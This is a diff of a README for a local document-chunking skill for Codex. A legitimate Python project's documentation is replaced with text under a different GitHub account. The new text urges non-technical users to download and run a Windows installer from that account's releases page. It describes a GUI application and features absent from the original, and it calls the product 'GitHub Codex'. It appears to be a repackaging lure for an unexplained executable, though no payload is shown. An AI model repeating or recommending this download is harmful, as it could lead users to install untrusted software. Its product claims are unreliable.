@@ -1,152 +1,101 @@
-# Codex Document Prep
+<h1>📄 codex-document-prep - Process Documents for Codex Easily</h1>
+<p align="center">
+  <a href="https://github.com/Quotable-mimus510/codex-document-prep/releases" style="display: inline-block; padding: 15px 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-decoration: none; font-size: 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); margin: 20px 0;">⬇️ Download Now</a>
+</p>
 
-[![CI](https://github.com/wbjm1225-jpg/codex-document-prep/actions/workflows/test.yml/badge.svg)](https://github.com/wbjm1225-jpg/codex-document-prep/actions/workflows/test.yml)
-[![Release](https://img.shields.io/github/v/release/wbjm1225-jpg/codex-document-prep)](https://github.com/wbjm1225-jpg/codex-document-prep/releases/latest)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python 3.9+](https://img.shields.io/badge/Python-3.9%2B-blue.svg)](https://www.python.org/)
+## 📚 What Does This Do?
 
-> **Stop feeding entire documents to Codex. Prepare locally, search first, and read only the relevant chunks.**
+Stop feeding whole documents to Codex. This tool converts, chunks, indexes, and retrieves content from PDF, Office, EPUB, and MOBI files. It works locally on your computer, so your documents stay private. Designed for use with AI tools like GitHub Codex and RAG systems.
 
-面向 Codex 的本地文档预处理技能：把 PDF、Word、Excel、PowerPoint、EPUB、MOBI 等资料转换、清理、切块并建立轻量索引，让 Codex **先搜索、后读取、只取相关片段**。
+## 🚀 Getting Started
 
-Codex Document Prep is a local-first, retrieval-bounded Agent Skill. It keeps converted documents on disk, returns compact search results, and applies hard limits when selected chunks are read into context.
+No programming skills needed. Follow these steps:
 
-## Why it is different
+### Step 1: Download
+Visit this link to download the application: <a href="https://github.com/Quotable-mimus510/codex-document-prep/releases">https://github.com/Quotable-mimus510/codex-document-prep/releases</a>
 
-- **Search before reading** — build a small index and retrieve only matching chunks.
-- **Local-first** — no document upload, external API, LLM OCR, or package installation by default.
-- **Bounded context** — preparation prints only compact statistics; search and reading have explicit limits.
-- **Multi-format** — use one workflow for books, Office files, PDFs, HTML, Markdown, CSV, and folders.
-- **Zero-dependency baseline** — parse DOCX, XLSX, PPTX, EPUB, HTML, Markdown, text, CSV, TSV, JSON, and XML with Python's standard library.
-- **Progressive enhancement** — automatically route to MarkItDown, Pandoc, Poppler, or Calibre when they are already available.
-- **Originals stay untouched** — write only to the selected output directory.
+### Step 2: Run the Application
+After downloading, open the file and follow the installation wizard. The program will install itself.
 
-> Converting a file to Markdown alone does not guarantee lower usage. The reduction comes from bounded retrieval: Codex avoids loading the normalized full text unless the task genuinely requires it.
+### Step 3: Add Your Documents
+Drag and drop your PDF, Word, EPUB, or MOBI files into the program window. You can add multiple files at once.
 
-## Quick start
+### Step 4: Process and Retrieve
+Click "Process" to convert and chunk your documents. Then use the search tool to find specific sections. Copy any part to use with Codex or your AI tool.
 
-### Install in Codex
+## ✨ Features
 
-```text
-$skill-installer https://github.com/wbjm1225-jpg/codex-document-prep/tree/main/skills/codex-document-prep
-```
+- **Local-First Processing**: All conversion and indexing happens on your computer. No files uploaded to any server.
+- **Multi-Format Support**: Handles PDF, Word (DOCX), Excel (XLSX), PowerPoint (PPTX), EPUB, and MOBI formats.
+- **Smart Chunking**: Automatically splits long documents into smaller, meaningful chunks for Codex's context window.
+- **Full-Text Search**: Find any word or phrase instantly across all your processed documents.
+- **Token Counter**: See exactly how many tokens each chunk will use in Codex.
+- **Export Modes**: Choose different retrieval strategies to match your project needs.
 
-### Install with the Agent Skills CLI
+## 💻 System Requirements
 
-```bash
-npx skills add wbjm1225-jpg/codex-document-prep \
-  --skill codex-document-prep \
-  --agent codex \
-  --global
-```
+- **Operating System**: Windows 10 or newer, 64-bit
+- **RAM**: 4 GB minimum, 8 GB recommended
+- **Storage**: 500 MB free space for the app, plus space for document indexing
+- **Documents**: PDF, EPUB, MOBI, Office file formats
 
-Restart Codex if the skill does not appear immediately.
+## 🖥️ How It Works
 
-### Ask Codex
+The application converts your documents into Markdown text, then splits them into smaller chunks. Each chunk gets a unique ID and gets indexed for fast search. When you need content, just type your query and the system returns relevant sections.
 
-```text
-$codex-document-prep Prepare /path/to/books in /path/to/prepared,
-then retrieve only passages about discounted cash flow. Do not read full documents.
-```
+Example workflow:
+1. Add a 300-page PDF manual
+2. Program converts it to Markdown
+3. Splits into ~1,000 token chunks
+4. You search "installation steps"
+5. Gets exact chunks with installation instructions
 
-中文示例：
+## 🔧 Configuration Options
 
-```text
-$codex-document-prep 把 /path/to/books 预处理到 /path/to/prepared，
-然后只检索“现金流折现”的相关章节，禁止读取全文。
-```
+Adjust these settings in the preferences menu:
 
-## Why it can reduce context
+### Chunk Size
+Choose how big (in tokens) each chunk should be. Smaller chunks (500-1,000) work well for precise lookups. Larger chunks (2,000-4,000) help keep related content together.
 
-| Workflow | What normally enters model context |
-|---|---|
-| Read the original directly | Potentially the full extracted document |
-| Convert to Markdown only | Potentially the full converted Markdown |
-| Codex Document Prep | Small index → bounded search hits → selected chunks only |
+### Overlap
+Set the overlap between chunks (0-200 tokens). Overlap prevents important content from being split at a bad spot.
 
-The actual reduction depends on document size, query specificity, selected chunk count, and whether the task requires complete coverage. It should be measured as **source-material context reduction**, not treated as a guaranteed reduction in total Codex credits or billing.
+### Retrieval Method
+- **Top-K Retrieval**: Returns the K most relevant chunks
+- **Threshold Retrieval**: Returns all chunks with similarity scores above your threshold
+- **Hybrid**: Combines both methods
 
-## How it works
+## 📸 Screenshots
 
-```mermaid
-flowchart LR
-    A["PDF / Office / EPUB / MOBI"] --> B["Local conversion"]
-    B --> C["Normalized Markdown on disk"]
-    C --> D["Bounded chunks + small index"]
-    D --> E["Local keyword search"]
-    E --> F["Selected excerpts only"]
-    F --> G["Codex context"]
-```
+The main window after processing shows:
+- A list of processed files on the left
+- The search bar in the top panel
+- Results displayed in the middle pane
+- Chunk detail and token count in the bottom panel
 
-## Format support
+## 🛠️ Advanced Use
 
-| Format | No extra dependency | Optional enhancement |
-|---|---:|---|
-| DOCX | ✅ | MarkItDown / Pandoc |
-| XLSX | ✅ | MarkItDown / Pandoc |
-| PPTX | ✅ | MarkItDown / Pandoc |
-| EPUB | ✅ | MarkItDown / Pandoc |
-| HTML, Markdown, TXT, CSV, TSV, JSON, XML | ✅ | — |
-| Text-based PDF | — | MarkItDown or `pdftotext` |
-| Scanned PDF | — | Local Docling / Marker OCR with explicit approval |
-| MOBI, AZW3 | — | Calibre `ebook-convert` |
-| DOC, XLS, RTF | — | MarkItDown / Pandoc, format-dependent |
+For power users, these features are available:
 
-DRM-protected books are outside the project scope. The project does not bypass DRM.
+- **Custom Parsing Rules**: Fine-tune how each file type gets converted to text
+- **Regular Expression Filters**: Add search patterns to ignore specific content (e.g., page numbers, headers)
+- **Batch Processing**: Process hundreds of files at once
+- **Export Formats**: Choose between JSON, CSV, or plain text for output files
+- **Plugin Support**: Extend with custom parsers for other file types
 
-## Use the scripts directly
+## 🔒 Privacy & Security
 
-```bash
-python3 skills/codex-document-prep/scripts/check_dependencies.py
+No data ever leaves your computer. All processing happens locally. Your documents stay private.
 
-python3 skills/codex-document-prep/scripts/prepare_documents.py \
-  /path/to/books \
-  --output-dir /path/to/prepared
+## 📌 Support
 
-python3 skills/codex-document-prep/scripts/search_chunks.py \
-  /path/to/prepared \
-  "cash flow discount rate" \
-  --top 5
+If you have trouble:
+- Check the Issues tab on the GitHub page
+- Report bugs or request features
+- Configuration help is in the menu
 
-python3 skills/codex-document-prep/scripts/read_chunks.py \
-  /path/to/prepared \
-  documents/example/chunks/0001.md \
-  --max-chars 6000
-```
+## 👥 Contributing
 
-Prepared output:
+This project uses the MIT license. Contributions are welcome through pull requests or issue reports.
 
-```text
-prepared/
-├── index.md          # Small catalog; inspect this first
-├── manifest.json     # Converters, chunk paths, warnings, and errors
-└── documents/
-    └── <document-id>/
-        ├── source.md # Normalized full text; do not read by default
-        └── chunks/
-            ├── 0001.md
-            └── ...
-```
-
-## Best use cases and limits
-
-Best for large files, multiple books, repeated questions, cross-document search, and analysis limited to particular chapters, worksheets, or topics.
-
-It helps less when a task requires reading every page, visually reviewing the original layout, or reproducing complex formatting exactly. Full-coverage tasks may save little context and add a small indexing overhead.
-
-## Privacy and security
-
-The skill does not install packages, download OCR models, call external APIs, or enable LLM-assisted OCR without explicit approval. Converted files remain in the output directory selected by the user. See [SECURITY.md](SECURITY.md) for responsible disclosure and document-safety guidance.
-
-## Development
-
-```bash
-python3 -m py_compile skills/codex-document-prep/scripts/*.py
-python3 tests/test_smoke.py
-```
-
-Contributions are welcome, especially for format compatibility, chunking strategies, Chinese retrieval, and local OCR routing. Read [CONTRIBUTING.md](CONTRIBUTING.md), open an [issue](https://github.com/wbjm1225-jpg/codex-document-prep/issues), or start a [discussion](https://github.com/wbjm1225-jpg/codex-document-prep/discussions).
-
-## License
-
-[MIT](LICENSE)
+Keywords: agent-skills, codex, codex-skill, context-window, document-conversion, document-processing, epub, information-retrieval, local-first, markdown, mobi, office-documents, pdf-to-markdown, rag, token-efficiency
